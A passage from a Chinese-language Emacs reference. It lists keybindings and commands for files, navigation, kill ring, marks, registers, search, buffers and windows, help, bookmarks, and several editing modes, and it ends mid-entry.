表明缓冲区的内容和磁盘上的一致。\n  * 表明文件被修改了，还没保存。\n  %% 表明文件是只读的。\n  % 表明文件是写保护的，但是已经被修改了。\nM-x menu-bar-mode能显示和隐藏菜单。\nM-x tool-bar-mode能显示和隐藏工具栏。\nM-x hl-line-mode 打开高亮当前行模式。\nM-x set-background-color      设置背景色。\nM-x set-foreground-color      设置前景色。\nM-x set-cursor-color          设置光标颜色。\n\ngtk版Emacs设置Widget外观 \n\n当我们使用 xlib 版的Emacs时，可以通过 XResource 定义 Emacs 的菜单\n栏、工具条、滚动条的外观。\n\n现在，在Linux上我们大多使用 gtk版的Emacs，是否还有办法定义 Emacs\n的菜单栏、工具条等的外观？\n\n一种方法是，通过 ~/.gtkrc 定义全局的 Gtk Widget 的外观。Emacs的外\n观自然也会改变。\n\n另一种方法是单独定制 emacs 的 Gtk Widget的外观。\nhttp://www.gnu.org/software/emacs/manual/htmlnode/emacs/GTK-resources.html\n讲述了 emacs 的资源名，以及如何定制。\n\n下面我们改变 Emacs 菜单栏的字体。\n在 ~/.emacs.d/ 下新建 `gtkrc` 文件。\n内容如下：\n\n    style \"emacs-menu\"\n    {\n      fontname = \"monospace 10\"\n      bg[NORMAL] = \"gray70\"\n      bg[ACTIVE] = \"gray75\"\n      fg[NORMAL] = {0.0, 0.2, 0.05}\n    }\n\n    widget \"menubar\" style \"emacs-menu\"\n    widget \"emacs-menuitem\" style \"emacs-menu\"\n\n现在重启 Emacs 看看，菜单栏是不是变样了？\n\n4. 与文件有关的操作 \n\nC-x C-f    查找文件并且在新缓冲区中打开。\n  当打开文件时，提示的路径可能不是你想要的，你可以输入 =//= ，\n  则提示的路径变为 =/= 。你也可以输入 =/~/= ，\n  则提示的路径变为 =~/= 。\nC-x C-r 以只读方式打开文件。\nC-x C-v    读入另一个文件，覆盖当前缓冲区的内容\nC-x i      把文件插入到光标的当前位置\nC-x C-s    保存文件\nC-x C-w    把缓冲区内容写入一个文件（另存为）\nC-x C-c    退出Emacs\n\n5. 光标移动 \n\nC-f     光标前移一个字符（右）\nC-b     光标后移一个字符（左）\nC-p     光标前移一行（上）\nC-n     光标后移一行（下）\nM-f (C-Right)    前移一个单词，也可以用C-right或M-right\nM-b (C-Left)    后移一个单词，也可以用C-left或M-left\nM-r     循环移动到窗口中间,窗口顶端,窗口底端\nC-a     移动到行首\nC-e     移动到行尾\nM-m     移动到第一个非空格字符\nM-e     前移一个句子\nM-a     后移一个句子\nM-}     前移一个段落\nM-{     后移一个段落\nC-v: scroll-up, 屏幕上卷一屏, 如果加参数N, 向上滚动N行. 如果N是\n  负数, 则相当于 C-u -N M-v.\nM-v: scroll-down, 屏幕下卷一屏.\nC-x   : scroll-left. This command is disabled by default.\nC-x \u003c: scroll-right. 加参数N可以指定滚动N列。\nC-x ]    前移一页（页由Ctrl+L分割，C-q C-l 可以插入一个分页符）\nC-x [    后移一页\nM-\u003c (C-Home) 移动光标到文档开头，其实可以加参数2-9，将光标移到距开头\n  0.2-0.9处，如M-5 M-\u003c 将光标定位到文档50%处。\nM-  (C-End)    后移到文件尾\nC-l: recenter-top-bottom. 重新绘制屏幕，当前行放在画面中心, 继续\n  调用该函数, 会把当前行放在窗口顶端, 然后是底端, 再然后又是中间.\n  在Emacs 23之前的版本中, C-l 只是绑定到 recenter. 是否重新绘制屏\n  幕受变量 recenter-redisplay的影响, 如果该变量值是 nil, 则始终不\n  重绘屏幕. 默认值是 tty, 表示只有在终端中才重绘屏幕.\nC-u n C-l: 将当前行滚动到距屏幕顶端第n行的位置，所以C-u 0 C-l，\n  将当前行移动到屏幕顶部。当然C-0 C-l或M-0 C-l也能实现同样的功能。\n  C-u C-l把当前行滚动到屏幕中间, 如果参数是负数, 则把当前行滚动到\n  距屏幕底部第n行的位置.\nC-M-l: reposition-window, 主要针对lisp文件, 尽量让定义或注释完全\n  可见. 例如, 如果函数定义不完全可见, 尽可能使整个函数可见. 如果函\n  数完全可见, 则将之滚动到屏幕顶端.\nC-o open-line, 插入空行, 如果光标在行首, 则在当前行上方插入空行;\n  如果光标在行尾, 则在当前行下方插入空行；如果光标在行中央, 则分割\n  当前行.\nC-x C-o 把多个空行合并成一个空行, 如果只有一个空行, 则删除这个空行.\nM-x flush-lines RET ^$ 删除选中区域的所有空行\n\nM-x goto-line 到文件第N行。\nM-x goto-char 到文件第N个字节。\n\n6. 删除剪切与复制 \n\n和vim相同，所有删除都是剪切操作。\n\n在 EMACS 中所谓的 kill-ring 是指一个存放从文件缓冲区中删除和\n复制的文本的地方。文本在缓冲区中是消失了， 但却储存在kill-ring。\nEMACS 可以有许多的缓冲区，但却只有一个 kill-ring。\nEMACS 所设计共享的 killing-ring 的用意是让被遗弃的文件可以找回， 而且各\n缓冲区彼此也可借由killing-ring 来建立一个互通的管道。\n因此，想将甲缓冲区中的某些文本给乙缓冲区，只要将那些文本放\n入 kill-ring 中，乙缓冲区就可以至此共享的 kill-ring 中将文本取出。\n\n要查看kill-ring中的内容， 键入 =Ctrl-h v= 后，echo area 处会出现提示：输入\n\"kill-ring\"， Emacs 会另开一个 视窗来显示 kill-ring的值。\n\nC-d或Del     删除光标位置上的字符\nBACKSPACE    删除光标位置上的字\nM-d          删除光标后面的单词\nM-DEL        删除光标前面的单词\nC-k          从光标位置删除到行尾\nC-S-BACKSPACE  不管光标位置在哪, 删除当前整行的内容 (kill-whole-line)\nM-k          删除到句子结尾\nC-x DEL    删除光标前面的句子\nC-M-k   删除point后面的sexp, kill-sexp.\nC-w     删除选中的文件块\nC-M-w   append-next-kill, 下一次kill的内容会追加到kill-ring中最新的entry.\nM-w     复制选中的文件块\nC-y 在当前位置粘贴剪贴板的内容, point在后，mark在开始处。C-u\n  C-y会使得point在前，mark在结束处。\nC-y M-y   即如果在粘贴命令后根一个M-y，则切换到剪贴板中前一个内容，\n  可以有多个M-y。\n按下M-x后在辅助输入区中输入\"kill-paragraph\"删除光标后面的段落，\n  按下\"backward-kill-paragraph\"删除光标前面的段落\nM-z CHAR 剪切到当前行指定的字符CHAR, 包括CHAR在内。\n\n7. 标记 \n\nC-@  标记文本块的开始（或结束）位置，\n  如果你的不是用C-SPC激活输入法，用C-SPC也可以开始标记。\n  或者M-x set-mark-command。\nM-@       从光标所在位置开始，标记到一个单词的末尾。\nC-M-@     在point后的表达式(如被括号包围的文本)的结尾设置标记.\nM-h     标记段落, 将 point 移到段首, 在段末设定标记.\nC-M-h 标记函数(mark-defun), 将 point 移到函数开头, 在函数末尾设\n  定标记.\nC-x C-x 交换当前插入点和上一个marker的位置。\nC-x C-p    标记页面, point 在页开始的地方, 在页结束的地方设定标记.\nC-x h    标记整个缓冲区\nM-h 标记一段, 重复按M-h会继续标记后面的段落. 可以加前缀参数, 如\n  C-u M-h, 会标记从当前段开始的后续四段. C-u -2 M-h 会标记从\n  point 向上的两段.\n如果用鼠标标记一个区域(鼠标左键拖动, 鼠标右键单击), 会自动将选定\n  的区域复制到kill-ring中.\nM-=, M-x count-words-region 会显示选中的区域中有多少行，多少词，多少个字符。\n  （注意，一个汉字也只算一个字符哦）\n\n可以应用于 region 的操作: \n\nM-%: query-replace.\nC-x TAB 或 C-M-\\\\ 缩进.\nM-x eval-region.\nC-x r s 将选定的内容copy到register中 (copy-to-register). 你可以\n  用 M-x append-to-register 向register中添加内容. C-x r i 将指定\n  register的内容插入到当前位置.\nM-$: ispell-region\nM-x delete-selection-mode. 开启这个模式后, 如果有选定的文本, 在\n  你输入文本时会自动删除选定的文本.\n\nmark ring \n\nmark的位置存储在mark ring中, 默认可以存储16个mark的位置. 你可以\n  通过设置 =mark-ring-max= 来改变这个值. 每个buffer都有自己的\n  mark ring.\n使用mark在文档中跳转的方法, C-SPC C-SPC在当前位置做一个标记, 然\n  后通过 C-u C-SPC可以回到做标记的地方. 如果\n  set-mark-command-repeat-pop 的值不是 nil, 则C-u C-SPC后就可\n  以继续按C-SPC回到以前的标记位置.\nEmacs也有一个全局的 mark-ring, 每当你激活一个标记, 在存入当前\n  buffer的mark-ring的同时, 也存入global-mark-ring. C-x C-SPC 可\n  以跳回到global-mark-ring中上一个mark所在的buffer和位置.\n\n收集分散的文本 \n\nM-x append-to-buffer 将选定的文本追加到指定buffer的光标处，光标\n  放在追加文本的末尾.\nM-x prepend-to-buffer 也是将选定的文本追加到指定的buffer处，光标\n  放在追加文本的开始处.\nM-x copy-to-buffer 用选定的文本替换 指定buffer 中原有的文本.\nM-x insert-buffer 将指定的 buffer 插入到光标处，光标放置于插入的\n  内容之前，并在插入内容的末尾放置标记. 比如你用 append-to-buffer\n  累积了一些文本到 buffer1 中，可以再用 insert-buffer buffer1 将累\n  积的文本取回来.\nM-x append-to-file 将选定的文本追加到指定文件的末尾.\n\n8. 寄存器 Registers \n\n寄存器可以存储 mark或point的位置, 文本, 矩形区域内的文本, 窗口配置, 文件名等.\n\n寄存器的名字可以是一个字母(区分大小写), 也可以是一个数字或者其它字符.\n\nM-x view-register R: 查看寄存器中R存放的内容.\nC-x r SPC R: point-to-register, 把point在哪个buffer什么位置的\n  信息记录下来.\nC-x r j R: jump-to-register, 跳转到寄存器R记录的位置. 如果缓冲区\n  已经关闭, Emacs会问你是否重新加载.\nC-x r s R: 复制region内的内容到R中. C-u C-x r s R, 在将region复\n  制到R中后从buffer中删除.\nC-x r i R: 将R中的内容插入到当前位置. Point在插入的文本前, mark\n  在插入的文本后. 以C-u引导则相反.\nM-x append-to-register RET R: 向R中追加文本. 以C-u引导也会从\n  buffer中删除选定的内容.\nM-x prepend-to-register RET R: 向R中已有的内容之前添加内容.\n\nC-x r r R: 把rectangle选定的内容存入寄存器R中. 同样用C-x r i R取回内容.\nC-x r w R: window-configuration-to-register, 将窗口配置存入R. 包\n  括窗口布局, 以及各窗口关联的缓冲区. C-x r j R可以恢复存储在R中的窗口配置.\nC-x r f R: frame-configuration-to-register, 将各帧的窗口布局, 缓\n  冲区等配置存入R, 同样用C-x r j R来恢复. C-u C-x r j R在恢复\n  frame configuration时, 会删除 frame configuration 不包含的帧.\nC-u NUMBER C-x r n R: 将数字NUMBER存入R. 如果没有参数,\n  会把0存入R. 同样用C-x r i R来插入.\nC-u NUMBER C-x r + R: 给R中存储的数字增加NUMBER, 如果没有参数, 增加1.\n(set-register ?R '(file . \"PATH\"))会把文件名存入R, C-x r j R会打开该文件.\n\n9. 查找与替换 \n\nC-s RET searchstring RET  向前开始非递增查找操作，\n  继续按C-s就会查找下一个。如果你上次搜索了beer，只需要按C-s C-s，\n  就会再搜索beer。如果你已经标记了要搜索的文本，只需要按C-s M-y。\n  可以用C-s M-p或C-s M-n翻看查找历史。\nESC C-s 递增地用正则表达式向前查找\nESC C-r 递增地用正则表达式向后查找\nC-r RET searchstring RET  和C-s对称，只不过是向后查找。\nC-s C-w    开始递增查找，把光标位置的单词做查找字符串\nC-s C-y    开始递增查找，把光标位置到行尾之间的文本做查找字符串\n多次按C-s进入增量搜索后，按Backspace可定位到上一个匹配处。\nM-x search-forward   非递增的向前查找\nM-x search-backward   非递增的向后查找\nM-x re-search-forward    非递增地用正则表达式向前查找\nM-x re-search-backward   非递增地用正则表达式向后查找\nC-s return C-w  向前开始单词查找（不受换行符、空格、标点符号影响）\nC-r return C-w  向后开始单词查找（不受换行符、空格、标点符号影响）\nM-x replace-string RET 旧字串 RET 新字串 RET（不征询意见）\nM-x replace-regexp 不征询意见地替换一个正则表达式\nM-% (M-x query-replace) 交互式替换。空格或y，替换并找到下一个；Del或n，\n  不替换，找到下一个；\".\"，替换并退出；\"!\"，替换剩下的全部，不要再问；\n  \"^\"，回到上一个；回车或q，退出查询替换。\nM-x query-replace-regexp 交互式替换正则表达式。\n\n10. 缓冲区、窗口和帧 \n\n缓冲区 \n\nC-x b    如果输入一个新的文件名则新建一个文件并且编辑,否则打开该文件\nC-x C-left    上一个缓冲区\nC-x C-right    下一个缓冲区\n\nC-x C-b   可以得到一个buffer列表，下面是列表的一些快捷键：\n  空格或n，下一个buffer\n  p，上一个buffer\n  1，全屏打开当前buffer\n  d或k，做删除的标记\n  x，执行标记的命令，比如有几个buffer标记了删除，x则删除这几个buffer。\n\nC-x s    保存全部缓冲区\nC-x k    删除缓冲区\nM-x kill-some-buffers 对每个缓冲区询问是否关闭\nM-x rename-buffer 重命名当前缓冲区\nC-x C-q    Toggle当前缓冲区的只读属性\n\n窗口 \n\nC-x 0    删除当前所在的窗口\nC-x 4 0  将缓冲区和窗口一起删除\nC-x 4 f  在别的窗口打开文件\nC-x 4 b  切换其它窗口中的缓冲区\nC-x 1    当前缓冲区满屏显示（常用的按键）, 或者按Esc Esc Esc关\n  闭其它窗口.\nC-x 2    创建上下排列的窗口\nC-x 3    创建左右排列的窗口\nC-x o    在窗口之间移动\nC-x ^    将窗口增高一行，也可以用M-x enlarge-window\nC-u n C-x ^   将窗口增高n行\nM-- C-x ^  将窗口垂直收缩一行，也可以用M-x shrink-window\nC-x }   将当前窗口增宽一列，也可以用M-x enlarge-window-horizontally\nC-x {   将当前窗口水平减一列，也可用M-x shrink-window-horizontally\nESC C-v或C-M-v 滚动其它窗口的内容。你也可以用M-PgDn和M-PgUp滚动\n  其它窗口内容。\n\n帧 (frame) \n\n一个frame就是一个Emacs窗口，这个窗口是被窗口管理器管理的窗口，\n有自己的菜单栏，工具栏的。\n\nC-x 5 0       删除当前的frame\nC-x 5 1       删除其它的frame\nC-x 5 b       在其它的frame中打开缓冲区\nC-x 5 f       在其它的frame中打开文件\n\nMiniBuffer \n\n按 RET 会退出MiniBuffer, 要想输入换行符, 可以输入 C-o 或 C-q C-j.\n默认情况下, 在 MiniBuffer 中输入 TAB, SPACE, ? 都会补全,\n  要想输入这些字符, 可以用C-q.\n当你在MiniBuffer中输入命令或参数时, 可能要在另一个窗口中弹出候选\n  项,当候选项多时, 你可以用 C-M-v 来滚动补全的内容, 或者用\n  M-PageUp 和 M-PageDown来上下滚动帮助内容.\n  似乎连续地按Tab键也可以让帮助内容向下滚动。\n在 MiniBuffer 输入过的东西会记录在 Minibuffer history list中,\n  =M-p= 和 UP 是上一个项目, =M-n= 和Down 是下一个项目, =M-r\n  REGEXP RET= 向前搜索符合正则表达式的项目, =M-s REGEXP RET=\n  向后搜索符合正则表达式的项目.\nminibuffer history list分为几个: 文件名, 缓冲区名, 命令参数,\n  Emacs命令, 编译命令...\nC-x ESC ESC 重新执行最近的一个命令.\nM-x list-command-history 会显示minibuffer的命令历史, 最近使用的排在最先.\n当在minibuffer中输入密码时, C-u: delete all; RET 或 ESC: submit.\n\n11. 编辑 \n\n一些方便的按键 \n\nM-m    移动光标到当前行的第一个非空字符\nESC ^    将这一行与上一行合并\nM-SPC    删除连续的空格，只保留一个\nM-\\\\     删除连续的空格, =C-u M-\\\\= 只删除 point 前面的空白字符.\nM-(      输入 =()=\nEsc, Tab (M-Tab)     用字典补全输入。\n插入/覆盖模式切换：M-x overwrite-mode是用来转换 insert mode\n  与 overwrite mode ，按Insert键可以实现同样的功能。\nC-i 相当于TAB，M-i 输入制表符。\nC-m 相当于RET；C-o在光标后重开一行，但光标保持不动。\nC-j 换行并根据当前模式缩进。M-j 重开一行并保持缩进，如果当前行是注\n  释，下一行也是注释。\nC-o 在光标后插入一个空白行。\nC-x C-o 删除多个连续的空行。\nlist-matching-lines: 列出符合给定模式的行(对整个文件).\ndelete-matching-lines: 删除符合模式的行. (如果有region, 作用于\n  region, 否则作用于光标到文件末尾)\ndelete-non-matching-lines: 与 delete-matching-lines 类似.\n\n输入特殊符号 \n\nC-q: (1) C-q后按特殊按键 如按TAB输入制表符；按回车(或C-m)输入回\n  车符, 等等. (2) C-q后可以跟ascII码, 如 =C-q 7 7 b= 会输入 =?b=.\nC-q C-m 会输入 ^M, C-q C-j 会输入换行符。\nC-x 8 可以插入一些特殊符号。\n\n  C-x 8 \"a ä\n  C-x 8 \"A Ä\n  C-x 8 ~D Ð\n  C-x 8 /e æ\n  C-x 8 /E Æ\n  C-x 8 ,c ç\n  C-x 8 ,C Ç\n  C-x 8 /o ø\n  C-x 8 \"o ö\n  C-x 8 \"s ß\n  C-x 8 ~t þ\n\n在多个位置间跳转 \n\n以前的marker存在mark ring中，所以可以用C-@ 或C-SPC在多个位置做标\n记，然后用C-u C-@ 或C-u C-SPC在当前缓冲区内跳转。用C-x C-@ 或C-x\nC-SPC在全局的标记位置内跳转。\n\n矩形区域操作 \n\n在矩形的左上角进行标记，然后将光标移动到矩形的右下角，\n就可以进行矩形操作了。\n\nC-x r d: delete-rectangle, 删除矩形区域的文字\nC-x r k: kill-rectangle, 删除矩形区域，并把它放入kill-ring\nC-x r y: yank-rectangle, 粘贴最后剪切的矩形区域\nC-x r o: open-rectangle, 将选定的rectangle用空格填充, 将已有的文本右移.\nC-x r c: clear-rectangle, 将矩形区域内的文本用空格替换.\nC-x r t STRING: 将矩形区域的每行用给定的字符串替换.\nM-x string-insert-rectangle RET STRING: 用字符串填充矩形区域,\n  原有文本右移.\nC-x r r R: 将矩形区域的内容存储在寄存器R中. 可以再用C-x r i R取回.\n进行矩形区域操作时打开CUA (common user access) mode会方便许多.\n  在CUA模式下, C-x 剪切, C-c复制, C-v粘贴, 如果选中了Region, 你输\n  入内容会删除Region. 如果你不想原来的Emacs键绑定产生干扰. 你可以\n  (setq cua-enable-cua-keys nil). 或者你可以按住shift来调用C-x, 如\n  果你想C-x C-f, 你要输入 S-C-x C-f, 或者你可以多按一次C-x, 如C-x\n  C-x C-f. 要启用CUA模式, M-x cua-mode RET.\n\n文本位置交换 \n\nC-t     交换光标所在字符与前一个字符的位置\nM-t     交换光标前后两个单词的位置\nC-x C-t    交换两个文本行的位置\n按下M-x后在辅助输入区中输入\"transpose-sentences\"交换两个句子的位置，\n  按下\"transpose-paragraph\"交换两个段落的位置\n\n改变字母大小写 \n\nM-c     单词首字母改为大写\nM-u     单词的字母全部改为大写\nM-l     单词的字母全部改为小写\nC-x C-l（downcase-region）使标记的区域变成小写\nC-x C-u（upcase-region）使标记的区域变成大写\nM-x upcase-initials-region, 选定区域首字母大写.\n\n撤销与重做 \n\n撤销操作 (undo）：C-x u或C-或C-/。\n重做。GNU Emacs本身没有Redo，不过可以借助undo undoes来实现。\n  在做了一系列undo后，只要让光标离开原来的位置，再执行undo的动作，\n  就会Redo。\n撤销上次保存后的所有操作：M-x revert-buffer RET。\n\n简单排版 \n\n如果想启用自动断行，M-x auto-fill-mode。\nM-s  让一行居中 (M-x center-line)\nM-S  让一段居中 (M-x center-paragraph)\nM-x center-region    让一个区域居中\nM-q (M-x fill-paragraph)  让一段自动断行\nM-x fill-region           让选中的区域自动断行\n统计字数：C-x h选中整个缓冲区。M-\\|会让你输入shell命令，\n  输入wc -w 统计单词数，输入 wc -m 可以统计字符数。\n统计中文字数：M-x count-words，会告诉你行数和字符数。不管使用什\n  么编码，每个汉字算是一个字符，所以字符数减去行数，就大致是汉字的\n  字数。比实际的汉字数要多，因为文中可能包含空格和英文字符。\n\n宏 \n\nC-x ( 开始宏，也可以按 F3 。\nC-x ) 结束宏，也可以按 F4 。\nC-x e 执行宏。\n\n重复操作 \n\nC-num 可以重复执行一条命令，比如C-9 \\可以连续插入9个星号。\n  M-num可以达到相同的目的. 即使数值参数超过9, 这种方式也可以工作.\n  如按住Meta时按下5, 放开meta再按6, 再输入其它命令, 则会重复56次.\n也可以用C-u num来辅助，如用C-u 20 \\插入20个星号。\n  如撤销10次操作：C-u 10 C-x u。\n如果C-u后面不加数值参数，则默认的数值参数是4。C-u C-u C-n 会向下移动16行.\n  但是要输入重复的数字，就需要用C-u来间隔重复的次数和要重复的数字，\n  例如：要输入20个5，C-u 20 C-u 5。\n有一个例外是，C-u 3 C-v不是翻3页，而是整个屏幕上移三行。\nC-x z重复上一次操作, 如果想重复一次以上, 就继续按z.\n\nabbrev \n\n=C-x a g= add-global-abbrev, 输入一个单词后，按C-x a g, 然后输入这个单词的缩写，再回车。\n=C-x a -= or =C-x a i g=, inverse-add-global-abbrev, 输入一个缩写，按这个序列，再输入完整的单词。\n=C-x a += or =C-x a C-a=, add-mode-abbrev, 为当前模式加入缩写。\n=C-x a i l= inverse-add-mode-abbrev, 反向（先写缩写，再写完整的）为当前模式加入缩写。\n\"C-x a '\" or \"C-x a e\" 扩展缩写。\n=C-x a n=, expand-jump-to-next-slot; =C-x a p=, expand-jump-to-previous-slot.\n\n12. 书签 \n\n书签可以看成一种特殊的寄存器, 和寄存器的区别在于寄存器的名字是单个\n字符, 而书签名可以是多个字符.\n\nC-x r m BOOKMARK RET 在光标当前位置设置一个书签, 如果直接回车,\n  会使用缓冲区的名字做书签名.\nC-x r b BOOKMARK RET  跳到指定的书签\nM-x bookmark-rename   重命名书签\nM-x bookmark-delete   删除书签\nM-x bookmark-insert-location: 插入BOOKMARK指向的文件名.\nM-x bookmark-insert RET BOOKMARK RET: 插入BOOKMARK指向文件的内容.\n\nM-x bookmark-save 用该命令, 可以随时保存书签列表, Emacs在退出时\n  也会自动保存默认的书签列表, 存储在 `~/.emacs.bmk`. 如果你想每\n  次新建书签都保存书签列表, (setq bookmark-save-flag 1).\nM-x bookmark-write    保存书签列表到特定的文件\nM-x bookmark-load     从特定的文件读取书签列表\n\nC-x r l   打开书签列表，下面是书签列表的一些快捷键：\n\n  f: 显示光标所在的书签\n  t: 是否显示和书签关联的文件路径\n  q: 退出书签列表\n  m: 标记在其它的窗口显示\n  v: 显示被标记的书签，如果没有标记的书签，就显示光标所在的书签\n  d: 做删除的标记\n  x: 删除被标记删除的书签\n  u: 移除标记\n\n13. 使用在线帮助 \n\nC-h t   运行Emacs教程。\nC-h C-f 查看Emacs FAQ.\nC-h [C-n, n] 查看最近版本的新特性.\nC-h C-p 查看已知的问题.\nC-h p 可以查看Emacs中包含了哪些包.\nC-h C-c, describe-copying, 查看GPL许可证。\n\nC-h c   describe-key-briefly, 查看某个键序列对应的命令。\nC-h k   比C-h c更详细。查看某个键序列对应的命令及做了什么。\n  像是C-h c和C-h f的结合。还可以查看某个菜单项对应的命令。\nC-h K 显示按键序列对应的手册. 注意: C-h c, C-h k 和 C-h K的参数\n  可以是按键序列, 也可以是菜单项或鼠标动作.\n\nC-h f 描述一个函数（或命令）做了什么。如果你使用Emacs23或更新的版本，你可\n  以用进行模糊查找。比如 ~C-h f buffer TAB~, 就会得到所有以buffer结尾的函数列\n  表。\nC-h F   打开对应命令的手册. command = interactive function.\n\nC-h b   describe-bindings, 显示所有活跃的键绑定.\nC-h w   查看对应某个命令的键绑定是什么。对应的是 where-is 命令。\nC-h d   查看匹配给定模式的关于变量和命令的文档.\nC-h v   查看某个变量的含义和它的值。\nC-h e   显示 \\Messages\\ buffer.\nC-h m   描述当前的模式。\nC-h l 查看我最后敲的100个字符是什么。等同于 M-x view-lossage,最\n  后键入的100个键盘输入称为 Lossage。有什么实际用途呢？\nC-h C-h 如果你记不住前面那么多的C-h没有关系，记住C-h C-h就可以\n  了。\n\nC-h a apropos-command, 查看哪些命令包含了某个子字符串。参数可以\n  是单个关键字, 关键字列表 和 正则表达式.\nC-u C-h a, show apropos commands or functions.\n  When looking for command by apropos-command, you can call it with 【Ctrl+u】 first.\n  It'll then also list functions.\nM-x apropos 查看哪些命令或变量包含了某个子串。默认不显示与命令对\n  应的按键, C-u M-x apropos会显示对应的按键(如果有绑定按键的话).\nM-x apropos-variable 列出用户可以定制的变量, 如果用C-u 做前缀,\n  列出所有匹配的变量.\nM-x apropos-value 列出附和条件的变量值。\nM-x apropos-documentation 搜索文档字符串匹配模式的命令和变量.\n\nM-x elisp-index-search 在elisp手册中寻找函数的文档\nM-x emacs-index-search 在emacs手册中寻找函数的文档\n\nC-h r   在Info中显示Emacs Manual.\n如果你在编辑程序，你可以按C-h S (info-lookup-symbol)在对应的手册\n  中找到光标下符号的入口，前提是你有Info版的手册。\nC-h i 或者M-x info查看帮助info。\n  运行 C-h i 指令，会先进入 info 树状结构的根部 (/usr/share/info)。\n  任何情况下， 可键入 =d= 回到此根部.\n\n  空格键和退格键，分别向下和向上滚动当前节点，并自动地跳到下一个和上一个节点。\n    当向下滚动遇到菜单时，会跳转到菜单引用的第一个节点。\n  h 介绍如何使用 info.\n  m MenuName 直接移动到指定的Menu上, 如m Emacs RET会跳转到Emacs的Info.\n  n 将结点移至下一个与此结点相连的结点。\n  p 将结点移至上一个与此结点相连的结点。\n  u 将结点移至上一层的结点。\n  t 移动到当前节点的top节点。\n    移动到当前文档指向的最后一个节点。\n  l 移动到之前访问的最后一个节点。\n  i keyword RET, 调用info-index命令，搜索索引中包含给定关键字的节点。\n    会在当前Info节点中搜索keyword, 按 ',' 到下一个匹配处.\n  s keyword RET 搜索手册, 可以输入正则表达式.\n  q 隐藏 Info 的缓冲区，可以按 C-x b 返回 Info.\n    若想真正关闭 Info，就像关闭一个普通缓冲区一样，C-x k RET\n  Tab 将光标移动到下一个交叉引用处，M-Tab则移动到上一个交叉引用处。\n\nC-h在后面输入，也很有用，比如：要看以C-c为前缀的有哪些键绑定，可\n  以按C-c C-h。常用的命令都以C-x为前缀，而和模式有关的按键一般以\n  C-c为前缀。再如：要看以C-x r为前缀的有哪些命令，可以按C-x r C-h。\n\nC-x = what-cursor-position 显示光标所在字符信息。\nM-x describe-char, 描述光标下的字符。\nM-x describe-font 描述光标下的字体信息。\nM-=, count-lines-region, 统计被选中的行数和字符数, 汉字算一个字符.\nM-x what-line, 显示光标所在的当前行数.\nM-x what-page, 显示光标在多少页多少行.\nC-x l, count-lines-page, 统计当前页多少行.\n\nC-h 相当于 F1, 可以跟在前缀按键后查看前缀按键都有哪些命令,\n有时C-h和前缀按键一起绑定到特定的命令, 但F1总是有效的. 如 C-x v\nF1 可以查看所有以 C-x v为前缀的键绑定对应的命令.\n\n14. 一些模式的帮助 \n\nC-h m 列出目前的mode的特殊说明。\n\nTEXT MODE \n\nM-Tab 单词的拼写补全\nM-S   段落居中\nM-s   本行居中\n\nHTML MODE \n\nC-c C-v  在浏览器中查看正在编辑的网页。\nC-c C-s (M-x html-autoview-mode) 在保存文档时自动打开浏览器显示\n  文档。\nC-c 1   插入1级标题。\nC-c 2   插入2级标题。\nC-c 3   插入3级标题。\nC-c 4   插入4级标题。\nC-c 5   插入5级标题。\nC-c 6   插入6级标题。\nC-c C-j  插入回车的标记。\nC-c RET  插入新的段落。\nC-c C-c -   插入分割线。\nC-c C-c h   插入链接标记。\nC-c C-c n   插入锚点。\nC-c C-c i   插入图片标记。\nC-c C-c o   插入排序列表。\nC-c C-c u   插入无序列表。\nC-c C-c l   插入列表项。\nC-c C-f     向前跳过同一级tag。\nC-c C-b     向后跳过同一级tag。\nC-c C-t     会提示你输入标签，如果你输入html，就会生成html文档的模板。\n  如果你输入别的标签，Emacs都会智能的补全。这是个非常有用的绑定。\nC-c /       闭合未闭合的标签，这个功能也很棒。\nC-c Tab     隐藏和显示标签。\n将光标移动到标签上，按C-c ?可以查看标签的简单含义。\nC-c C-n     用于输入特殊字符，指被html标签占用的字符，如：\n  C-c C-n SPC会输入 `\u0026nbsp; ，C-c C-n \u003c 会输入 \u0026lt;` 。\nC-c DEL     删除光标所在的标签，包括与之配对的标签。\n\nOutline模式 \n\nC-c C-n  移动到下一个可见的标题\nC-c C-p  移动到上一个可见的标题\nC-c C-f  移动到下一个同级标题\nC-c C-b  移动到上一个同级标题\nC-c C-u  移动到上一级\nC-c C-t  收起正文\nC-c C-d  收起子标题\nM-x hide-entry   收起指定标题的正文\nC-c C-a  显示所有\n\nTex模式 \n\nM-x plain-tex-mode 进入plain-Tex模式\nM-x latex-mode     进入latex模式\nM-x validate-tex-buffer   检查缓冲区内容是否符合Tex语法。\nC-c C-f            保存并编译当前文件。\nC-c C-v            预览编译结果(dvi文件)。\nC-c TAB            bibtex\nC-j                插入两个硬回车，即Tex中的分段，并检查段落的语法\nC-c {              插入{}，并将光标置于其中间。\nC-c }              如果光标在{}之间，将光标定位到\\}。\nC-c C-e            对于latex中的\\\\begin{x}，自动补全\\\\end{x}。\nC-c C-o            插入\\\\begin{。\nM-RET              插入\\\\item。\n\nrst模式 \n\nreStructuredText 是我常用的文档格式。\n\nC-c C-t            显示文档目录。\nC-t C-u            更新文档目录。\nC-c C-n            下一节。\nC-c C-p            上一节。\nC-c RET            标记当前节。\nC-c 1              编译当前rst为html文档。\nC-c C-b            把当前域转换为无序列表。\nC-c C-e            把当前域转换为有序列表。\nC-c C-v            把无序列表转换为有序列表。\nC-c C-d            把当前域转换为line block。\nC-c C-l            把当前域左移。\nC-c C-r            把当前域右移。\n\nnarrow模式 \n\nC-x n n narrow模式：让你聚焦于选中的区域，隐藏其他的文本。\nC-x n w 从narrow模式恢复。\n\nFollow模式 \n\n两个窗口显示同一个缓冲区时，可以设置follow mode (M-x follow-mode)，\n滚动一个窗口时，另一个窗口会跟着滚动。\n\n两个窗口显示的内容是连续的，如果你的光标移出了一个窗口的范围，\n它会出现在另一个窗口里。不清楚这个模式有什么作用。\n\n15. 编程 \n\n一些编程模式下通用按键 \n\n快速移动 \n\nC-M-a (M-x beginning-of-defun) 到当前或上一个函数定义的开始处。\nC-M-e (M-x end-of-defun) 到当前或下一个函数定义的开始处。\nC-M-h (M-x mark-defun) 选中当前或下一个函数。\nC-M-u (M-x backward-list) 到当前程序块的开始\nC-M-n (M-x forward-list) 到下一个程序块的开始，或是当前程序块的结束。\nC-M-f 向前匹配括号；C-M-b 向后匹配括号。\n\n缩进 \n\nESC C-\\\\ 选中区域的每行都缩进。 (M-x indent-region)\nC-M-\\\\: indent-region\nC-c C-q: 缩进当前函数。\nC-c . RET STYLE RET' Select a predefined style STYLE (c-set-style').\n\n注释 \n\n=ESC ;= 或 =M-;=    在当前行右边注释。如果选中区域，则注释/反注释选中的区域。\nM-x 